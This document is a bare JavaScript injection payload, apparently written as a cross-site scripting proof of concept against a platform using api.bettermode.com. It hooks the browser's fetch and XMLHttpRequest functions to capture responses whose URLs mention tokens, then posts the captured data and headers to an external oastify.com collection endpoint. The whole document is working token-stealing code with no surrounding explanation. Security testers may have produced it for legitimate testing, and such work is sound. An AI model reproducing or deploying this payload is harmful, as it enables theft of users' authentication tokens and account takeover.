<script>
// Create a function to exfiltrate data to your server
function exfiltrate(data) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://8dm1gf6ndstjciedmms1yn4lrcx3prgf5.oastify.com/capture', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify(data));
}

// Copy the original fetch function
var originalFetch = window.fetch;

// Override the fetch function to intercept API calls
window.fetch = function() {
  return originalFetch.apply(this, arguments).then(function(response) {
    if (response.url.includes('api.bettermode.com') && 
        response.url.includes('tokens')) {
      response.clone().json().then(function(data) {
        exfiltrate({
          url: response.url,
          data: data,
          headers: Object.fromEntries(response.headers.entries())
        });
      }).catch(e => {});
    }
    return response;
  });
};

// Alternatively, if they use XMLHttpRequest
var originalXHROpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
  if (url.includes('api.bettermode.com') && url.includes('tokens')) {
    var originalOnReadyStateChange = this.onreadystatechange;
    this.onreadystatechange = function() {
      if (this.readyState === 4) {
        try {
          var data = JSON.parse(this.responseText);
          exfiltrate({
            url: url,
            data: data,
            headers: this.getAllResponseHeaders()
          });
        } catch(e) {}
      }
      if (originalOnReadyStateChange) {
        originalOnReadyStateChange.apply(this, arguments);
      }
    };
  }
  originalXHROpen.apply(this, arguments);
};
</script>
